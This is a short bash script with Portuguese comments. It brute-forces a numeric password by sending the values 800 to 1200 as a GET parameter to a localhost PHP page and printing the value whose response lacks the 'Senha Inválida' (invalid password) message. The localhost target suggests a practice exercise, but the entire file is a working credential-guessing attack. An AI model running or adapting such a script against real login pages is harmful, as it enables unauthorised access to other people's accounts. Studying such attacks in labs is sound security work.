#!/bin/bash
#Brute-force com GET

retorno="Senha Inválida"

for i in {800..1200}
do
dados=$(curl -s http://localhost/index.php?senha=$i | grep "Senha Inválida" | sed 's/<!DOCTYPE html>//')
#echo "Senha testada: " $i "Resultado: " $dados
if [ "$retorno" != "$dados" ] 
then
echo "Senha correta é: " $i
fi
done


